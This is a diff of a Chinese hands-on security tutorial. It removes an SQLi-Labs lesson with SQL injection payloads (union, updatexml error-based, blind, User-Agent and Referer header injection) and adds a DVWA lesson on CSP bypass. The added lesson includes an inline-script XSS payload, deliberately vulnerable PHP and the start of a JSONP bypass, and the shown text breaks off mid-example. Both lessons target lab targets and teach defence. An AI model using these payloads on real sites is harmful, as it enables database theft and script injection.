@@ -1,1076 +1,567 @@
-# Day 14：SQLi-Labs进阶注入Less11-25
+# Day 14：DVWA实战-内容安全策略绕过 CSP Bypass
 
-> **🎯 靶场实战** | 难度：⭐⭐⭐ | 预计学习：75 分钟
-
----
-
-# 第14章 SQLi-Labs进阶注入（Less11-25）
-
-哈喽小伙伴们，咱们又见面啦！🎉 上一章咱们一路过关斩将，搞定了SQLi-Labs的前10关，是不是感觉自己已经有点小厉害了？嘿嘿，别骄傲，那只是开胃小菜！
-
-前10关咱们玩的都是**GET型注入**，说白了就是参数都在URL里，改改网址就能注入。但现实世界里，注入点可不止URL这一个地方哦！
-
-今天这一章，咱们就要开启进阶模式啦！🚀 咱们会遇到：
-- POST注入（参数藏在请求体里）
-- Cookie注入（注入点在Cookie里）
-- Header注入（User-Agent、Referer这些请求头里也能注入）
-- 各种绕过技巧（注释符被过滤了怎么办？or和and被过滤了怎么办？）
-- 二阶注入（藏得更深的注入）
-
-坐稳扶好，咱们的进阶之旅开始啦！
+> **🎯 靶场实战** | 难度：⭐⭐⭐⭐ | 预计学习：70 分钟
 
 ---
 
-## 14.1 开篇引入：注入点无处不在
+# 第14章 DVWA实战：内容安全策略绕过（CSP Bypass）🛡️
 
-在开始打关卡之前，咱们先聊一个重要的概念：**注入点到底在哪里？**
+哈喽各位小伙伴们大家好！👋 欢迎来到第14章！
 
-🤔 很多新手小伙伴以为SQL注入只能在URL的参数里，其实大错特错！
+上一章我们讲了 Weak Session IDs 弱会话 ID，学会了"猜 Session 就能冒充别人登录"的会话劫持攻击。今天这一章，我们要讲的是一个跟 Day 11 XSS 紧密相关的防御机制——**CSP（Content-Security-Policy，内容安全策略）**，以及"防御机制配置错了，一样被打穿"的经典场景：**CSP Bypass（CSP 绕过）**。
 
-给大家举个生活中的例子 🍜：
-你去面馆吃面，跟服务员说"我要一碗牛肉面"。服务员把你的话告诉后厨，后厨按照你的要求做面。
+大家还记得 Day 11 学 XSS 的时候，我们往搜索框里输入 `<script>alert(document.cookie)</script>`，一回车浏览器就弹出了 Cookie 吗？😈 那是因为当时的 DVWA 没有开任何"浏览器级别的防御"，浏览器看到 `<script>` 标签就老老实实地执行了。
 
-- **GET注入**就像是你在门口的点餐牌上写"牛肉面"，所有人都能看见，你改改字就能换面。
-- **POST注入**就像是你悄悄跟服务员说，别人看不见，但服务员还是会传给后厨。
-- **Cookie注入**就像是你戴了个胸牌，上面写着"老顾客，爱吃辣"，服务员看到胸牌就知道你的口味。
-- **Header注入**就像是你穿了件印有"我是VIP"的衣服，服务员看到你的穿着就给你特殊待遇。
+但现实世界中的网站，不会这么傻。很多现代网站都会在 HTTP 响应头里加一行叫 **Content-Security-Policy** 的指令，相当于给浏览器下达一道"圣旨"：
 
-发现了吗？**只要是你能控制的、最终会被拼到SQL语句里的东西，都可能是注入点！**
+> 📜 **奉天承运皇帝诏曰：** 从今以后，这个网页里只能加载"我允许的这几个域名"下的 JS 脚本、CSS 样式、图片；`<script>` 标签直接写在 HTML 里的（叫内联脚本 / inline script）一律不准执行！`eval()` 函数一律不准调用！敢违抗的资源，直接给朕拦截掉！钦此。
 
-URL参数、POST表单、Cookie、User-Agent、Referer、X-Forwarded-For……这些地方都有可能！
+听起来是不是特别厉害？🥷 这不就相当于"把 XSS 彻底给掐死了"吗？——毕竟 XSS 的本质就是往页面里插一段内联 JS 或者加载外域 JS，CSP 直接从浏览器层面就给你拦了，还执行个屁啊？
 
-好，理论讲完了，咱们开干！💪
+**理论上确实如此。** 但是——（安全领域最迷人的就是这两个字"但是" 😎）
 
----
+> CSP 这道圣旨，**写圣旨的人如果写错了字、圈错了白名单域名、把"闲人免进"写成了"欢迎光临"**，那这道圣旨反而会变成一张废纸，浏览器的金钟罩瞬间变成"皇帝的新装"，XSS 照打不误！
 
-## 14.2 POST注入篇（Less11-17）
+今天这一章，我们就来看 DVWA 的 CSP Bypass 模块里，四种"把圣旨写错了"的搞笑案例——
+- Low 级别：圣纸上写着"所有人都可以进来玩"，等于没开 CSP
+- Medium 级别：圣纸上圈了 ajax.googleapis.com 作为"允许的 JS 域名"，但这个域名上有 JSONP 接口可以被我们利用执行任意 JS
+- High 级别：圣纸上写着"只有带正确 nonce（通行令牌）的 JS 才能执行"，但 nonce 生成算法是当天日期 MD5 一下，攻击者一秒就算出来了
+- Impossible 级别：圣旨写得滴水不漏，我们学一下正确姿势
 
-### 14.2.1 Less-11：POST - 单引号 - 字符型 - 报错注入
-
-#### 什么是POST注入？
-
-首先咱们来搞明白：什么是POST注入？
-
-还记得GET和POST的区别吗？给大家复习一下：
-
-- **GET请求**：参数在URL里，比如 `?id=1`，长度有限制，看得见
-- **POST请求**：参数在请求体里，长度没限制，相对隐蔽
-
-就像寄信 ✉️：
-- GET就像是把内容写在信封表面，谁都能看见，而且写不了多少字
-- POST就像是把内容写在信纸里，装在信封里，外面看不见，能写很多字
-
-但不管是写在信封上还是信纸里，只要内容最终会被拼到SQL语句里，就可能有注入！
-
-#### 怎么测试POST注入？
-
-测试POST注入，咱们需要工具帮忙。最常用的就是 **Burp Suite**，咱们之前装过对吧？
-
-当然，也可以用浏览器插件，比如 **HackBar**，或者直接用浏览器的开发者工具。
-
-这一关咱们用的是一个登录表单，用户名和密码是POST提交的。
-
-咱们先随便输入点东西试试，比如用户名输入 `admin`，密码输入 `123456`，点击登录。
-
-哎？登录失败了，但是页面没什么特别的。那怎么判断有没有注入呢？
-
-老办法，加单引号试试！😏
-
-在用户名那里输入 `admin'`，密码随便输，点击登录。
-
-哇！页面报错了！看到那个MySQL的错误信息了吗？这说明有注入点！而且是单引号闭合的字符型注入。
-
-#### 联合查询注入步骤
-
-既然是字符型单引号注入，那思路就跟GET注入一样啦！只是参数传递的方式从GET变成了POST而已。
-
-咱们来回顾一下注入步骤：
-
-**第一步：判断字段数**
-
-用 `order by` 来判断有多少个字段。
-
-在用户名那里输入：
-```
-admin' order by 2#
-```
-密码随便输。
-
-哎？页面正常显示了（虽然还是登录失败，但没有报错）。说明字段数至少是2。
-
-再试试 `order by 3#`，报错了！说明只有2个字段。
-
-**第二步：判断显示位**
-
-用联合查询来看看哪些位置会显示数据。
-
-用户名输入：
-```
-' union select 1,2#
-```
-注意哦，前面的单引号要闭合，而且前面的查询结果要为空，所以直接写个单引号就行，不用写admin。
-
-点击登录，你会看到页面上显示了 `1` 和 `2`，说明两个位置都能显示数据！
-
-**第三步：爆数据库名**
-
-用户名输入：
-```
-' union select database(),version()#
-```
-这样就能拿到数据库名和MySQL版本啦！
-
-**第四步：爆表名、字段名、数据**
-
-后面的步骤就跟GET注入完全一样了，我就不啰嗦了。大家自己动手试试吧！
-
-💡 **小提示**：POST注入和GET注入的思路是一模一样的，只是参数放的地方不一样而已。GET是放在URL里，POST是放在请求体里。只要找到了注入点，后面的玩法都一样！
+每一个级别依然是大白话比喻 + Burp 抓包实操 + 逐行源码解析 + 真实案例复盘，零基础放心跟。坐稳扶好，咱们出发！🚀
 
 ---
 
-### 14.2.2 Less-12：POST - 双引号+括号 - 字符型 - 报错注入
+## 14.1 前置知识：CSP 到底是个啥？大白话"门卫+白名单"模型 🛡️
 
-好，咱们来看Less-12。
+### 14.1.1 生活比喻：公司楼下的"严格门卫制度"🏢
 
-这一关跟Less-11几乎一模一样，也是登录表单，也是POST提交。那区别在哪呢？区别在于**闭合方式不一样**！
+想象你去一个世界 500 强公司办事，这家公司安保特别严，楼下的门卫大爷手里拿了一张**《允许进入人员/物品白名单》**，严格对照执行：
 
-咱们还是用单引号试试。用户名输入 `admin'`，点击登录……哎？居然没报错？
-
-这说明什么？说明不是单引号闭合的。那试试双引号？
-
-用户名输入 `admin"`，点击登录。
-
-哇！报错了！而且从错误信息里咱们能看到，SQL语句大概是这样的：
-```sql
-SELECT * FROM users WHERE username=("admin"") and password=("") LIMIT 0,1
+```
+📋 XX 公司安保白名单V1.0（贴在门卫室墙上）
+┌──────────────┬─────────────────────────────────────────────┐
+│ 类别         │ 规则                                         │
+├──────────────┼─────────────────────────────────────────────┤
+│ 人员         │ ① 只允许本公司员工（工牌=www.xx.com 域名）    │
+│              │ ② 只允许长期合作客户（合作公司A/B/C 域名）    │
+│              │ ③ 一切陌生人一律不准进！                     │
+├──────────────┼─────────────────────────────────────────────┤
+│ 随身行李     │ ① 禁止带不明液体、尖锐利器（= eval/Function）│
+│              │ ② 禁止带"手写小纸条"（= 内联 inline script） │
+└──────────────┴─────────────────────────────────────────────┘
 ```
 
-看到了吗？闭合方式是 `")`，也就是**双引号加括号**！
+你走到门口，门卫大爷会做三件事：
+1. 先看你带没带工牌 → 工牌上的公司是不是白名单里的？
+2. 再看你手里有没有"手写小纸条" → 白名单里明确说禁止带，直接没收
+3. 你包里带的东西是不是违禁品？→ 有就直接没收
 
-知道了闭合方式，后面的步骤就跟Less-11完全一样啦！只是把单引号换成 `")` 而已。
+**这个门卫大爷 = 你电脑上的 Chrome/Edge/Firefox 浏览器**
+**这张贴在墙上的白名单 = HTTP 响应头里的 Content-Security-Policy 头**
+**你要进的这栋楼 = 你正在访问的网页**
+**你（访客/员工）= 网页要加载的 JS、CSS、图片、字体等资源**
 
-比如判断字段数：
-```
-admin") order by 2#
-```
-
-联合查询：
-```
-") union select 1,2#
-```
-
-是不是很简单？只要找到了闭合方式，剩下的都是套路！🎯
-
----
-
-### 14.2.3 Less-13：POST - 单引号+括号 - 双注入 - 字符型
-
-继续前进！Less-13来啦！
-
-还是熟悉的登录表单，还是POST提交。咱们还是老规矩，先测试闭合方式。
-
-用户名输入 `admin'`，点击登录……报错了！
-
-看看错误信息，SQL语句大概是这样的：
-```sql
-SELECT * FROM users WHERE username=('admin'') and password=('') LIMIT 0,1
-```
-
-哦！这次是 `')` 闭合，也就是**单引号加括号**！
-
-但是等等……这一关叫"双注入"是什么意思？🤔
-
-咱们试试用联合查询行不行。用户名输入：
-```
-') union select 1,2#
-```
-
-哎？页面好像没显示1和2啊？怎么回事？
-
-哦！原来这一关**查询结果不回显**！页面只告诉你登录成功还是失败，或者报错信息，但是不会把查询结果显示出来。
-
-那怎么办呢？没关系，咱们还有**报错注入**！也就是利用MySQL的报错信息来把数据"带"出来。
-
-#### updatexml报错注入
-
-咱们之前学过 `updatexml()` 函数对吧？再来复习一下：
-
-`updatexml()` 函数的作用是修改XML文档的内容，语法是：
-```
-updatexml(目标XML, XPath路径, 新内容)
-```
-
-如果XPath路径格式不对，MySQL就会报错，而且会把XPath路径的内容显示在错误信息里。
-
-咱们就利用这个特点，把想查的数据放在XPath路径的位置，让MySQL报错的时候把数据"吐"出来！😈
-
-咱们来试试，用户名输入：
-```
-') and updatexml(1,concat(0x7e,database(),0x7e),1)#
-```
-
-解释一下：
-- `')` 是闭合前面的SQL语句
-- `and updatexml(...)` 是咱们的报错函数
-- `concat(0x7e, database(), 0x7e)` 是把数据库名前后加上~符号（0x7e是~的十六进制），这样看得更清楚
-- `#` 是注释掉后面的内容
-
-点击登录，哇！看到了吗？错误信息里显示了数据库名！
-
-太棒了！这就是报错注入的威力！即使查询结果不回显，只要有报错信息，咱们就能拿到数据！
-
-后面爆表名、字段名、数据的方法都一样，只要把 `database()` 换成对应的查询语句就行。
-
-比如爆表名：
-```
-') and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)#
-```
-
-注意哦，因为 `updatexml()` 里只能放一个值，所以要用 `limit 0,1` 一个一个地拿。
-
-💡 **小知识**：这一关叫"双注入"，其实双注入是另一种报错注入的方法，用的是 `count(*)`、`rand()`、`group by` 这些函数组合。不过 `updatexml()` 更好用也更简单，咱们掌握这个就行啦！
+这就是 CSP 的大白话模型！**它是浏览器强制执行的"资源加载白名单"，不是服务器端的，而是浏览器在渲染页面之前就先检查一遍，不符合规则的资源直接拦掉，连执行/加载的机会都不给你。**
 
 ---
 
-### 14.2.4 Less-14：POST - 双引号 - 双注入 - 字符型
+### 14.1.2 看一眼真实的 CSP 响应头长啥样
 
-Less-14来啦！这一关跟Less-13很像，也是查询结果不回显，需要用报错注入。
+打开浏览器 F12 → Network 面板，随便访问一个大厂首页（比如 `https://www.github.com`），点一下主文档那个请求，看 Response Headers：
 
-区别在哪呢？还是老问题——**闭合方式不一样**！
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Date: Mon, 29 Jun 2026 12:00:00 GMT
 
-大家自己试试，这一关的闭合方式是双引号 `"`。
-
-我就不详细讲步骤了，跟Less-13一样，只是把 `')` 换成 `"` 就行。
-
-比如：
-```
-" and updatexml(1,concat(0x7e,database(),0x7e),1)#
-```
-
-是不是发现规律了？不管是什么注入，只要找到了闭合方式和注入类型，剩下的都是换汤不换药！🔄
-
----
-
-### 14.2.5 Less-15：POST - 单引号 - 布尔盲注 - 时间盲注
-
-好，咱们来看Less-15。
-
-还是登录表单，还是POST提交。咱们还是先试试单引号……
-
-哎？怎么回事？输入 `admin'` 之后，页面既没有报错，也没有显示查询结果，只是显示登录失败而已？
-
-这是什么情况？😱
-
-别急，这种情况咱们之前也见过——**盲注**！
-
-盲注分为两种：
-- **布尔盲注**：页面只会有两种状态（真或假），比如登录成功和登录失败
-- **时间盲注**：页面连真假都不告诉你，只能通过页面响应时间来判断
-
-这一关呢，页面会根据查询结果的真假显示不同的内容（登录成功或失败），所以咱们可以用**布尔盲注**。
-
-如果布尔盲注也用不了，那咱们还有**时间盲注**这个终极武器！
-
-#### 布尔盲注思路
-
-咱们来回忆一下布尔盲注的思路：
-
-1. 先判断数据库名的长度
-2. 再一个字符一个字符地猜数据库名
-3. 然后爆表名、字段名、数据
-
-比如判断数据库名长度是不是5：
-```
-admin' and length(database())=5#
+# ↓ 下面这行就是 CSP 头，这一大串全是"门卫大爷的白名单规则"
+Content-Security-Policy:
+  default-src 'none';
+  script-src 'self' https://github.githubassets.com 'nonce-abc123xyz';
+  style-src 'self' 'unsafe-inline' https://github.githubassets.com;
+  img-src 'self' data: https://avatars.githubusercontent.com https://user-images.githubusercontent.com;
+  font-src 'self' https://github.githubassets.com;
+  connect-src 'self' https://api.github.com;
+  frame-src 'self' https://github.com;
+  report-uri https://api.github.com/_private/browser/errors;
 ```
 
-如果页面显示登录成功（或者跟正常输入admin的状态一样），说明长度是5；如果还是登录失败，说明不是。
+第一次看是不是像看天书？😵 别怕，我们把它翻译成"门卫白名单规则表"，一行行对着讲，10 秒就懂：
 
-然后猜第一个字符是不是 's'：
-```
-admin' and ascii(substr(database(),1,1))=115#
-```
+| CSP 指令（规则头） | 大白话 = 门卫的什么规则？ | 上面例子值的含义 |
+|---|---|---|
+| `default-src 'none'` | **默认规则（兜底）**：所有类别如果没单独写规则，一律"谁都不准进" | 最严格的兜底，任何类别没明确写就全拦 |
+| `script-src` | **脚本（也就是 JS 文件）**的加载白名单 | 只允许：① 本站自己域名的 JS ② github.githubassets.com 域名的 JS ③ 带 nonce=abc123xyz 通行令牌的内联脚本 |
+| `style-src` | **CSS 样式文件**的白名单 | 允许本站、允许内联 style（unsafe-inline）、允许官方 assets 域名 |
+| `img-src` | **图片**的白名单 | 允许本站、data:Base64 图、用户头像图床、用户上传图床 |
+| `font-src` | **字体文件**（.woff2 之类） | 只允许本站 + assets 域名 |
+| `connect-src` | **AJAX / Fetch / WebSocket 后端接口** | 只允许调本站 + api.github.com |
+| `frame-src` | **<iframe> 嵌套页面** | 只允许嵌套自己 github.com 的页面 |
+| `report-uri` | **违规举报地址** | 谁违反了 CSP 规则，浏览器就把违规详情 POST 到这个接口（服务器会收到告警日志） |
 
-（115是小写字母s的ASCII码）
-
-这样一个字符一个字符地猜，最终就能把整个数据库名猜出来。
-
-#### 时间盲注思路
-
-如果连布尔盲注都用不了（比如页面不管真假都显示一样的内容），那咱们就用时间盲注。
-
-时间盲注的原理是：用 `if()` 函数加 `sleep()` 函数，如果条件为真，就延迟几秒；如果条件为假，就不延迟。通过看页面响应时间来判断条件是否成立。
-
-比如：
-```
-admin' and if(length(database())=5,sleep(5),1)#
-```
-
-如果数据库名长度是5，页面就会延迟5秒才加载；如果不是，就会很快加载完。
-
-这样咱们也能一个字符一个字符地把数据猜出来。
-
-这一关两种盲注都能用，大家可以都试试！
-
-💡 **生活小例子** 🍵：
-布尔盲注就像是你问服务员"今天有没有牛肉面？"，服务员只会回答"有"或"没有"，你得一个问题一个问题地问，最终猜出来今天有什么面。
-
-时间盲注就更惨了，服务员连话都不跟你说，你问"有没有牛肉面？"，如果有，他就等5秒再理你；如果没有，他就立刻不理你。你只能通过他理你的时间来判断答案。
-
-虽然慢了点，但只要方法对，早晚能猜出来！🐢
+就这么简单！**CSP = 一堆"xx-src 白名单"拼起来的字符串，浏览器拿到后严格照着执行。**
 
 ---
 
-### 14.2.6 Less-16：POST - 双引号+括号 - 布尔盲注 - 时间盲注
+### 14.1.3 面试官最爱问：CSP 和 XSS 的关系？一句话回答！
 
-Less-16来啦！这一关跟Less-15几乎一样，也是盲注。
+这个问题面试高频出现，一句话记住标准答案：
 
-区别在哪呢？哈哈，你们肯定猜到了——**闭合方式不一样**！
+> **CSP 是用来缓解（Mitigate）XSS 攻击的浏览器端防护机制，它不能从根上消灭 XSS（要消灭 XSS 还得靠输出编码 + 模板引擎自动转义），但能把"即便 XSS 漏洞存在，攻击者能执行任意 JS"的概率从 99% 降到 1%——前提是 CSP 配置得对！**
 
-这一关的闭合方式是 `")`，也就是双引号加括号。
+大白话：**CSP 就像你家防盗门的"第二道锁"**——第一道锁（输出编码）是主锁，一定要锁好；第二道锁（CSP）是副锁，主锁万一忘关了，副锁还能挡一下。但是你家副锁的钥匙就挂在门边上（CSP 配置错了），那副锁等于白装。😅
 
-大家自己动手试试吧！把Less-15的payload里的单引号换成 `")` 就行。
-
-比如布尔盲注：
-```
-admin") and length(database())=8#
-```
-
-时间盲注：
-```
-admin") and if(length(database())=8,sleep(5),1)#
-```
-
-是不是觉得越来越顺手了？只要掌握了思路，换个闭合方式那都不叫事儿！😎
+好，前置知识彻底搞明白了。现在进 DVWA CSP Bypass 模块，实操开干！🎯
 
 ---
 
-### 14.2.7 Less-17：POST - 单引号 - 更新查询 - 报错注入
+## 14.2 Low 级别：门卫大爷喝多了——白名单直接写了"允许所有人"🟢
 
-好，咱们来看Less-17。这一关有点不一样哦！
+打开 DVWA，难度调到 **Low**，左侧菜单点击 **CSP Bypass**（有些版本叫 Content Security Policy，是一个东西）。
 
-打开页面一看，哎？这不是登录表单了，变成了**密码重置**的功能！
+我们先按规矩看一下 HTTP 响应头里的 CSP 规则写了啥——这是打 CSP Bypass 的**第一原则：永远先抓包看 Response Headers 里的 Content-Security-Policy，不要猜！** 📏
 
-输入用户名和新密码，就能重置密码。
+**实操步骤：**
+1. 打开 Burp Suite → Proxy → Intercept is ON
+2. 浏览器进入 CSP Bypass 模块（Low 难度）
+3. Burp 抓到响应包，我们看 Response Headers：
 
-这有什么不一样的呢？🤔
-
-咱们来想想，密码重置功能背后的SQL语句是什么样的？
-
-应该是这样的：
-```sql
-UPDATE users SET password='新密码' WHERE username='用户名'
+```http
+HTTP/1.1 200 OK
+Date: Mon, 29 Jun 2026 12:05:00 GMT
+Server: Apache
+X-Powered-By: PHP/7.4.33
+# ★★★ 重点！Low 级别的 CSP 头写在这儿！★★★
+Content-Security-Policy: "default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval' * data:"
+Vary: Accept-Encoding
+Content-Length: 1234
 ```
 
-哦！原来是 **UPDATE语句**，不是SELECT语句了！这就是"更新查询"的意思。
+你没看错！我们把这行 CSP 翻译一下：
 
-那UPDATE语句能注入吗？当然能！
+| 规则 | 翻译门卫大白话 |
+|---|---|
+| default-src 'self' | 默认资源只能本站（后面 script-src 单独写了，覆盖默认规则） |
+| **script-src 'unsafe-inline' 'unsafe-eval' * data:** | **脚本白名单：** <br>① 允许内联脚本（'unsafe-inline'=允许手写小纸条）<br>② 允许 eval（'unsafe-eval'=允许带不明液体）<br>③ 允许任何域名（\* = 全世界任何人都能进！）<br>④ 允许 data: 协议（Base64 编码脚本也能执行） |
 
-咱们来试试，在用户名那里输入 `admin'`，新密码随便输，点击提交。
-
-哇！报错了！说明有注入点，而且是单引号闭合的。
-
-那能不能用联合查询呢？答案是——**不行**！因为UPDATE语句是更新数据的，不是查询数据的，所以不能用 `union select`。
-
-那怎么办呢？没关系，咱们还有**报错注入**！报错注入在UPDATE、INSERT、DELETE这些语句里都能用！
-
-咱们来试试，用户名输入：
+**我勒个去……😱 这也叫开了 CSP？** 门卫大爷直接把白名单写成：
 ```
-admin' and updatexml(1,concat(0x7e,database(),0x7e),1)#
+✅ 允许陌生人
+✅ 允许带手写小纸条
+✅ 允许带不明液体
+✅ 允许带任何东西
 ```
-新密码随便输。
-
-点击提交，看到了吗？错误信息里显示了数据库名！
-
-太棒了！报错注入果然是万能的！🎉
-
-后面爆表名、字段名、数据的方法都一样，我就不重复了。
-
-💡 **注意事项** ⚠️：
-这一关是UPDATE语句，也就是说你提交的东西真的会修改数据库里的数据！所以大家测试的时候要小心，别把数据改乱了。如果不小心改乱了，可以去SQLi-Labs的首页重置数据库。
-
-另外，除了updatexml，extractvalue也可以用来报错注入，大家也可以试试。
+这等于**直接把白名单写成了"欢迎全世界所有坏人随便进"**啊！Low 级别开的不是 CSP，开的是 CSP 的"反向开关"——告诉浏览器"你啥都别拦，啥都能执行" 😂。
 
 ---
 
-## 14.3 Header注入篇（Less18-20）
+### 14.2.1 Low 级别实操：直接 `<script>` 弹框，秒通关！🎉
 
-好啦，POST注入咱们就先聊到这。接下来咱们要玩一个更刺激的——**Header注入**！
+既然 CSP 都写了允许 `'unsafe-inline'` 和 `*`，那我们直接上 Day 11 最朴素的 XSS Payload 就完事儿了。
 
-什么是Header注入呢？就是注入点不在参数里，而在HTTP请求头里！
+DVWA CSP Bypass 模块有一个输入框，让你输入"你的名字"，后端会把你输入的名字直接放到页面里显示（典型的反射型 XSS 场景，Day 11 学过的！）。
 
-什么？请求头里也能注入？当然能！只要是用户可控的、会被拼到SQL语句里的东西，都可能有注入！
+**Payload 输入：**
+```html
+<script>alert('CSP Bypass Low Level! 我直接进来了！😎');</script>
+```
+
+点击 Submit（或者 Go 按钮，看版本）——然后看浏览器：
+> 🎉 弹窗成功！！屏幕上弹出 "CSP Bypass Low Level! 我直接进来了！😎"
+
+F12 的 Console 面板里**没有任何 CSP 拦截报错**，因为我们的 Payload 100% 符合 Low 级别写的"啥都允许"CSP 规则，门卫大爷不仅不拦，还给你递烟 😂。
 
 ---
 
-### 14.3.1 Less-18：POST - User-Agent - 报错注入
+### 14.2.2 Low 级别 View Source 逐行源码解析 🔬
 
-先来看Less-18。打开页面一看，哎？又是登录表单？
+点 View Source 看一下代码，顺便看看那个"什么都允许"的 CSP 头是怎么写出来的：
 
-咱们先试试用 `admin` 和 `admin` 登录（对，密码也是admin）。
+```php
+<?php
+// ★★★ Low 级别的 CSP 头就是写在这里的！★★★
+$headerCSP = "Content-Security-Policy:
+  default-src 'self';
+  script-src 'unsafe-inline' 'unsafe-eval' * data:;
+  style-src 'self';
+";
 
-登录成功之后，页面显示了一些信息，其中有一行是：
-```
-Your User Agent is: ......
-```
+header($headerCSP);   // ← 把上面的规则塞到响应头里
 
-哦！它把咱们浏览器的User-Agent显示出来了！
+$html = "";
+if (isset($_POST['include'])) {     // 取用户 POST 过来的 include 参数（名字）
+    $html .= $_POST['include'];     // ★ 直接放到页面里！连 htmlspecialchars 转义都没做！
+}
+?>
 
-User-Agent是什么呢？简单说就是**浏览器的身份证** 🪪，它会告诉服务器你用的是什么浏览器、什么操作系统。
-
-那既然User-Agent会被显示出来，它会不会被存到数据库里呢？如果会的话，那咱们修改User-Agent是不是就能注入了？
-
-来试试！咱们需要用Burp Suite抓包，然后修改User-Agent的值。
-
-先在登录页面输入正确的用户名密码（admin/admin），然后用Burp抓包，把请求发给Repeater。
-
-在请求头里找到User-Agent那一行，它原来可能长这样：
-```
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...
-```
-
-咱们给它加个单引号试试，改成：
-```
-User-Agent: '
-```
-
-然后点击发送，看看响应……哇！报错了！
-
-太棒了！果然有注入！而且是在User-Agent这个请求头里！
-
-那怎么注入呢？既然有报错信息，咱们还是用报错注入！
-
-不过等等，这里的SQL语句是什么样的呢？从错误信息来看，大概是这样的：
-```sql
-INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('[User-Agent]', '[IP]', 'admin')
+<!-- 下面是页面 HTML，一个输入框 -->
+<form name="csp" method="POST">
+    <p>输入你的名字：</p>
+    <input type="text" size="50" name="include" value="" id="include" />
+    <input type="submit" value="Submit" />
+</form>
+<div class="vulnerable_code_area">
+    <?php echo $html;   // ★ 输出用户输入，不转义 + CSP 啥都允许 = 完美反射型 XSS！ ?>
+</div>
 ```
 
-哦！原来是INSERT语句！而且有三个值：User-Agent、IP地址、用户名。
-
-那咱们的注入语句要怎么写呢？咱们需要把第一个值闭合，然后用逗号分隔，最后注释掉后面的内容。
-
-来试试，把User-Agent改成：
-```
-' and updatexml(1,concat(0x7e,database(),0x7e),1), '1', '1')#
-```
-
-等等，好像不对。INSERT语句里用报错注入的话，其实不用那么麻烦，直接在值里用报错函数就行。
-
-咱们试试这个：
-```
-' or updatexml(1,concat(0x7e,database(),0x7e),1) or '
-```
-
-解释一下：
-- 第一个 `'` 闭合前面的单引号
-- `or updatexml(...)` 是咱们的报错函数
-- `or '` 是为了闭合后面的单引号，让SQL语句语法正确
-
-点击发送，哇！看到了吗？错误信息里显示了数据库名！
-
-完美！这就是Header注入！是不是很有意思？注入点居然在User-Agent里！😱
-
-后面爆表名、字段名、数据的方法都一样，把 `database()` 换成你想查的东西就行。
+**一句话点评 Low：** **"开了，但完全没开"**。CSP 头里的 script-src 写了 `'unsafe-inline'` 和 `*`，直接等于放弃治疗，还不如不加这个头——加了反而给运维一种"我们有 CSP 防护"的虚假安全感。
 
 ---
 
-### 14.3.2 Less-19：POST - Referer - 报错注入
+## 14.3 Medium 级别：门卫只认"Ajax 公司"的员工，但 Ajax 公司里有内鬼 🟡
 
-好，咱们来看Less-19。
+好，难度调到 **Medium**，我们再看响应头里的 CSP——这次开发者"看起来"学聪明了，知道把 `'unsafe-inline'` 和 `*` 去掉，改成只信任两个域名：
 
-这一关跟Less-18很像，也是登录之后显示一些信息。咱们先用admin/admin登录看看。
-
-登录成功之后，页面显示：
+Burp 抓包拿到 Medium 的 CSP 头：
+```http
+Content-Security-Policy: "
+  default-src 'self';
+  script-src 'self' https://ajax.googleapis.com https://cdnjs.cloudflare.com;
+  style-src 'self' 'unsafe-inline';
+"
 ```
-Your Referer is: ......
+
+翻译一下新的脚本白名单：
+> 脚本只能加载来自：① 我自己网站（self）② https://ajax.googleapis.com（Google 的 Ajax CDN）③ https://cdnjs.cloudflare.com（另一个知名 CDN）。**没有写 'unsafe-inline'**，所以内联 `<script>` 直接写 HTML 里是要被拦的！
+
+哇！这次是不是终于安全了？我们的 `<script>alert(1)</script>` 内联脚本肯定被拦对不对？——没错，你可以先试一下，同样的 Payload 现在 F12 Console 会报这个红色错：
+
+```
+❌ Refused to execute inline script because it violates the following
+   Content Security Policy directive: "script-src 'self' https://ajax.googleapis.com ...".
+   Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce...
+   is required to enable inline execution.
 ```
 
-哦！这次显示的是Referer！
+**内联脚本确实被拦了！** 看来 Medium 级别的 CSP 是真的起作用了，这咋办呢？😰
 
-Referer是什么呢？简单说就是**你从哪个页面来的** 🧭。比如你从百度点击链接跳到了这个页面，那Referer就是百度的网址。
-
-既然显示了Referer，那说明Referer也被存到数据库里了。那咱们能不能注入呢？当然能！
-
-还是一样的方法，用Burp抓包，找到Referer请求头，加个单引号试试。
-
-如果报错了，那就说明有注入！然后还是用报错注入，跟Less-18的方法一样，只是位置从User-Agent换到了Referer而已。
-
-我就不详细演示了，大家自己动手试试吧！
-
-💡 **小总结**：Header注入的思路其实跟普通注入一样，只是注入点的位置不同而已。User-Agent、Referer、X-Forwarded-For、Cookie……这些请求头都可能有注入点，只要它们会被拼到SQL语句里。
+嘿嘿，别慌！注意白名单里这两个域名：**ajax.googleapis.com** 和 **cdnjs.cloudflare.com** —— 它们是全世界最大的两个 JS CDN，上面存了 jQuery、Angular、Vue 等几十万个前端库。但是，这些 CDN 上有一类特别的接口，叫 **JSONP**！而 JSONP 天生就有"回调自定义函数名"的特性——**正好可以被我们用来绕过 CSP！** 🕵️
 
 ---
 
-### 14.3.3 Less-20：POST - Cookie - 报错注入
+### 14.3.1 前置小补丁：10 秒搞懂什么是 JSONP（零基础也能懂！）
 
-接下来是Less-20。这一关咱们来玩**Cookie注入**。
+JSONP 这个词如果第一次听别害怕，大白话 10 秒讲清楚：
 
-Cookie是什么呢？简单说就是**网站存在你浏览器里的小纸条** 📝。比如你登录了一个网站，网站就会给你发一个Cookie，里面存着你的登录信息。下次你再访问这个网站，浏览器就会把Cookie带上，网站就知道你是谁了。
+> 早年浏览器有 **同源策略**（Day 7 CSRF 提过），不同域名不能随便 AJAX 拿数据。于是程序员发明了一个"绕同源"的土办法：**服务器返回的不是 JSON 数据，而是一段"把数据当参数传给你指定函数名"的 JS 代码**，这就是 JSONP。
 
-好，咱们来看看这一关。还是登录页面，先用admin/admin登录。
+举个栗子你一秒就懂：
+- 我（前端）在 ajax.googleapis.com 上想查一个 jQuery 的版本信息
+- 我发请求：`https://ajax.googleapis.com/ajax/services/feed/load?v=1.0&q=xxx&callback=myFunc`
+- 注意 URL 最后那个 `&callback=myFunc`！它的意思是："Google 服务器，你返回数据的时候，外面给我包一层 `myFunc( 你的数据 )`"
+- Google 的 JSONP 接口真听话，返回：
+  ```javascript
